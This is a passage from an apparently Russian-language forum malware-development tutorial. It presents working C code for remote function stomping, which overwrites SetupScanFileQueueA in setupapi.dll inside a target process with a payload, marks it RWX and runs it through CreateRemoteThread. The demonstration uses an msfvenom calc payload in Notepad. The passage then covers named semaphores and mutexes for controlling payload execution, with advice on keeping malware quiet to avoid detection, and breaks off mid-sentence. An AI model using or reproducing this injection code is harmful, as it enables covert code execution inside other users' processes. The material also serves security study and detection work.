–ù–∞–ø—Ä–∏–º–µ—Ä, –¥–≤–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞, A –∏ B, –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Kernel32.dll, –Ω–æ –∞–¥—Ä–µ—Å DLL –º–æ–∂–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –≤ –∫–∞–∂–¥–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –∏–∑-–∑–∞ —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏–∏ –º–∞–∫–µ—Ç–∞ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ (Address Space Layout Randomization). –û–¥–Ω–∞–∫–æ VirtualAlloc, –∫–æ—Ç–æ—Ä—ã–π —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ Kernel32.dll, –±—É–¥–µ—Ç –∏–º–µ—Ç—å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–π –∞–¥—Ä–µ—Å –≤ –æ–±–æ–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö.<br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é —É–¥–∞–ª–µ–Ω–Ω–æ, DLL, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–∞—è —Ü–µ–ª–µ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é, –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, —á—Ç–æ–±—ã –Ω–∞—Ü–µ–ª–∏—Ç—å—Å—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é SetupScanFileQueueA, –∫–æ—Ç–æ—Ä–∞—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ Setupapi.dll, <b>—ç—Ç–æ—Ç DLL –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å. </b><br />
<br />
–ï—Å–ª–∏ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª Setupapi.dll, —Ñ—É–Ω–∫—Ü–∏—è SetupScanFileQueueA –Ω–µ –±—É–¥–µ—Ç –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–ø–∏—Å–∏ –ø–æ –∞–¥—Ä–µ—Å—É, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.<br />
<br />
<b>–ö–æ–¥ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–π –∫–æ–¥ –ø–æ—Ö–æ–∂ –Ω–∞ –∫–æ–¥ –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ —Ñ—É–Ω–∫—Ü–∏–∏, –æ–¥–Ω–∞–∫–æ –æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ä–∞–∑–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–∏ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define        SACRIFICIAL_DLL            &quot;setupapi.dll&quot;
#define        SACRIFICIAL_FUNC           &quot;SetupScanFileQueueA&quot;
// ...

BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {

    DWORD    dwOldProtection            = NULL;
    SIZE_T    sNumberOfBytesWritten      = NULL;

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtectEx [RW] –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten){
        printf(&quot;[!] WriteProcessMemory –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %d \n&quot;, GetLastError());
        printf(&quot;[!] –ë–∞–π—Ç—ã –∑–∞–ø–∏—Å–∞–Ω—ã: %d –∏–∑ %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtectEx [RWX] –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    HANDLE        hProcess        = NULL,
                hThread            = NULL;
    PVOID        pAddress        = NULL;
    DWORD        dwProcessId        = NULL;

    HMODULE        hModule            = NULL;

    if (argc &lt; 2) {
        wprintf(L&quot;[!] –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ : \&quot;%s\&quot; &lt;–ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞&gt; \n&quot;, argv[0]);
        return -1;
    }

    wprintf(L&quot;[i] –ü–æ–∏—Å–∫ ID –ø—Ä–æ—Ü–µ—Å—Å–∞ \&quot;%s\&quot; ... &quot;, argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &amp;dwProcessId, &amp;hProcess)) {
        printf(&quot;[!] –ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω \n&quot;);
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);
    printf(&quot;[i] –ù–∞–π–¥–µ–Ω–Ω—ã–π PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞: %d \n&quot;, dwProcessId);



    printf(&quot;[i] –ó–∞–≥—Ä—É–∑–∫–∞ \&quot;%s\&quot;... &quot;, SACRIFICIAL_DLL);
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf(&quot;[!] LoadLibraryA –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);


    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf(&quot;[!] GetProcAddress –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] –ê–¥—Ä–µ—Å \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);


    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –∑–∞–ø–∏—Å–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ ... &quot;);
    getchar();
    printf(&quot;[i] –ó–∞–ø–∏—Å—å ... &quot;);
    if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);



    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ ... &quot;);
    getchar();

    hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
–ù–∞—Ü–µ–ª–∏–≤–∞–µ–º—Å—è –Ω–∞ –ø—Ä–æ—Ü–µ—Å—Å Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783589203.png"
		data-src="https://osint42.org/attachments/1746783589203-png.155/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783589203-png.155/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783589203.png"
			title="1746783589203.png"
			width="1195" height="598" loading="lazy" />
	</div><br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783595609.png"
		data-src="https://osint42.org/attachments/1746783595609-png.156/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783595609-png.156/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783595609.png"
			title="1746783595609.png"
			width="1329" height="808" loading="lazy" />
	</div><br />
<br />
–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏ SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783607243.png"
		data-src="https://osint42.org/attachments/1746783607243-png.157/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783607243-png.157/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783607243.png"
			title="1746783607243.png"
			width="1358" height="640" loading="lazy" />
	</div><br />
<br />
–ó–∞–º–µ–Ω–∞ –±–∞–π—Ç–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783618322.png"
		data-src="https://osint42.org/attachments/1746783618322-png.158/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783618322-png.158/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783618322.png"
			title="1746783618322.png"
			width="1296" height="564" loading="lazy" />
	</div><br />
<br />
–ó–∞–ø—É—Å–∫ –Ω–∞–≥—Ä—É–∑–∫–∏<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783624461.png"
		data-src="https://osint42.org/attachments/1746783624461-png.159/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783624461-png.159/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783624461.png"
			title="1746783624461.png"
			width="1568" height="877" loading="lazy" />
	</div></div>
						

							<h2>–ö–æ–Ω—Ç—Ä–æ–ª—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783836965.png"
		data-src="https://osint42.org/attachments/1746783836965-png.160/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783836965-png.160/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783836965.png"
			title="1746783836965.png"
			width="1538" height="729" loading="lazy" />
	</div><br />
<br />
–í —Ä–µ–∞–ª—å–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏—è—Ö –≤–∞–∂–Ω–æ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏—è, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ü–û, –∏ –∫–æ–Ω—Ü–µ–Ω—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è –Ω–∞ –æ—Å–Ω–æ–≤–Ω—ã—Ö –∑–∞–¥–∞—á–∞—Ö.<br />
–ß–µ–º –±–æ–ª—å—à–µ –¥–µ–π—Å—Ç–≤–∏–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, —Ç–µ–º –≤–µ—Ä–æ—è—Ç–Ω–µ–µ, —á—Ç–æ –µ–≥–æ –æ–±–Ω–∞—Ä—É–∂–∞—Ç —Å–∏—Å—Ç–µ–º—ã –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞.<br />
<br />
–í–æ—Ç –Ω–∞–ø—Ä–∏–º–µ—Ä —Ç–∞–∫–∞—è —Å–∏—Ç—É–∞—Ü–∏—è, –∫–∞–∫ –≤ —ç—Ç–æ–º —É—Ä–æ–∫–µ, –ø—Ä–∞–≤–∏–ª–æ–º —Ö–æ—Ä–æ—à–µ–≥–æ —Ç–æ–Ω–∞ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å—é –∞—Ç–∞–∫—É–µ–º–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª, –∞ –ø–æ—Ç–æ–º –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏—é.<br />
<br />
–ù–æ –¥–ª—è —ç—Ç–æ–≥–æ –Ω—É–∂–Ω–æ –∑–Ω–∞—Ç—å, —á—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–ø–æ–ª–Ω–∏–ª–∞—Å—å.)<br />
<br />
–û–±—ä–µ–∫—Ç—ã —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ Windows –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –≠—Ç–∏ –æ–±—ä–µ–∫—Ç—ã –∫–æ–æ—Ä–¥–∏–Ω–∏—Ä—É—é—Ç –¥–æ—Å—Ç—É–ø –∫ –æ–±—â–∏–º —Ä–µ—Å—É—Ä—Å–∞–º –¥–ª—è –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ—Ç–æ–∫–æ–≤ –∏–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –æ–±–µ—Å–ø–µ—á–∏–≤–∞—è –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–π –¥–æ—Å—Ç—É–ø –∫ –æ–±—â–∏–º —Ä–µ—Å—É—Ä—Å–∞–º –∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—è –∫–æ–Ω—Ñ–ª–∏–∫—Ç—ã –∏–ª–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –≥–æ–Ω–∫–∏, –∫–æ–≥–¥–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–æ—Ç–æ–∫–æ–≤ –∏–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø—ã—Ç–∞—é—Ç—Å—è –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –æ–¥–Ω–æ–º—É –∏ —Ç–æ–º—É –∂–µ —Ä–µ—Å—É—Ä—Å—É. –ò—Å–ø–æ–ª—å–∑—É—è –æ–±—ä–µ–∫—Ç—ã —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –º–æ–∂–Ω–æ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å, —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ.<br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–∏–ø–æ–≤ –æ–±—ä–µ–∫—Ç–æ–≤ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –≤–∫–ª—é—á–∞—è —Å–µ–º–∞—Ñ–æ—Ä—ã, –º—å—é—Ç–µ–∫—Å—ã –∏ —Å–æ–±—ã—Ç–∏—è. –ö–∞–∂–¥—ã–π —Ç–∏–ø –æ–±—ä–µ–∫—Ç–∞ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω–∞—á–µ, –Ω–æ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –≤—Å–µ –æ–Ω–∏ —Å–ª—É–∂–∞—Ç –æ–¥–Ω–æ–π —Ü–µ–ª–∏ - –∫–æ–æ—Ä–¥–∏–Ω–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ –æ–±—â–∏–º —Ä–µ—Å—É—Ä—Å–∞–º.<br />
<br />
<b>–°–µ–º–∞—Ñ–æ—Ä—ã</b><br />
<br />
–°–µ–º–∞—Ñ–æ—Ä—ã - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∑–Ω–∞—á–µ–Ω–∏–µ, —Ö—Ä–∞–Ω—è—â–µ–µ—Å—è –≤ –ø–∞–º—è—Ç–∏, –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –æ–±—â–µ–º—É —Ä–µ—Å—É—Ä—Å—É. –°—É—â–µ—Å—Ç–≤—É–µ—Ç –¥–≤–∞ —Ç–∏–ø–∞ —Å–µ–º–∞—Ñ–æ—Ä–æ–≤: –±–∏–Ω–∞—Ä–Ω—ã–µ –∏ —Å—á–µ—Ç–Ω—ã–µ.<br />
<br />
<b>–ë–∏–Ω–∞—Ä–Ω—ã–π —Å–µ–º–∞—Ñ–æ—Ä</b> –∏–º–µ–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ 1 –∏–ª–∏ 0, —É–∫–∞–∑—ã–≤–∞—è, –¥–æ—Å—Ç—É–ø–µ–Ω –ª–∏ —Ä–µ—Å—É—Ä—Å –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. <b>–°—á–µ—Ç–Ω—ã–π —Å–µ–º–∞—Ñ–æ—Ä</b>, —Å –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –∏–º–µ–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ –±–æ–ª—å—à–µ 1, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –∏–ª–∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –ø–æ–ª—É—á–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ä–µ—Å—É—Ä—Å—É.<br />
<br />
–î–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–∏ –∫–∞–∂–¥–æ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å—Å—è –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–π –æ–±—ä–µ–∫—Ç —Å–µ–º–∞—Ñ–æ—Ä–∞. –ï—Å–ª–∏ –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑, –ø–µ—Ä–≤–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–æ–∑–¥–∞—Å—Ç –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–π —Å–µ–º–∞—Ñ–æ—Ä, –∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –∫–∞–∫ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–ª–æ—Å—å. –ü—Ä–∏ –ø–æ—Å–ª–µ–¥—É—é—â–∏—Ö –∑–∞–ø—É—Å–∫–∞—Ö —Å–æ–∑–¥–∞–Ω–∏–µ —Å–µ–º–∞—Ñ–æ—Ä–∞ –Ω–µ —É–¥–∞—Å—Ç—Å—è, —Ç–∞–∫ –∫–∞–∫ —Å–µ–º–∞—Ñ–æ—Ä —Å —Ç–∞–∫–∏–º –∂–µ –∏–º–µ–Ω–µ–º —É–∂–µ —Ä–∞–±–æ—Ç–∞–µ—Ç. –≠—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤ –Ω–∞—Å—Ç–æ—è—â–µ–µ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –∑–∞–ø—É—Å–∫–∞ –∏ –ø–æ—ç—Ç–æ–º—É –Ω–µ –¥–æ–ª–∂–Ω–∞ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —Å–Ω–æ–≤–∞, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
CreateSemaphoreA –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ–±—ä–µ–∫—Ç–∞ —Å–µ–º–∞—Ñ–æ—Ä–∞. –í–∞–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –µ–≥–æ –∫–∞–∫ –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–π —Å–µ–º–∞—Ñ–æ—Ä, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –ï—Å–ª–∏ –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–π —Å–µ–º–∞—Ñ–æ—Ä —É–∂–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, CreateSemaphoreA –≤–µ—Ä–Ω–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –æ–±—ä–µ–∫—Ç–∞, –∏ GetLastError –≤–µ—Ä–Ω–µ—Ç ERROR_ALREADY_EXISTS.<br />
<br />
–í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –∫–æ–¥–µ, –µ—Å–ª–∏ —Å–µ–º–∞—Ñ–æ—Ä &quot;ControlString&quot; —É–∂–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, GetLastError –≤–µ—Ä–Ω–µ—Ç ERROR_ALREADY_EXISTS.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, &quot;ControlString&quot;);

if (hSemaphore != NULL &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS)
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è
else
    // –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è</code></pre>
	</div>
</div><br />
<b>–ú—å—é—Ç–µ–∫—Å—ã</b><br />
<br />
–ú—å—é—Ç–µ–∫—Å, —Å–æ–∫—Ä–∞—â–µ–Ω–Ω–æ –æ—Ç &quot;–≤–∑–∞–∏–º–Ω–æ–≥–æ –∏—Å–∫–ª—é—á–µ–Ω–∏—è&quot;, - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–æ–º –∫ –æ–±—â–∏–º —Ä–µ—Å—É—Ä—Å–∞–º —Å—Ä–µ–¥–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∏ –ø–æ—Ç–æ–∫–æ–≤. –ù–∞ –ø—Ä–∞–∫—Ç–∏–∫–µ –ø–æ—Ç–æ–∫, –ø—ã—Ç–∞—é—â–∏–π—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –æ–±—â–µ–º—É —Ä–µ—Å—É—Ä—Å—É, –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Å—Ç–∞—Ç—É—Å –º—å—é—Ç–µ–∫—Å–∞. –ï—Å–ª–∏ –æ–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω, –ø–æ—Ç–æ–∫ –∂–¥–µ—Ç, –ø–æ–∫–∞ 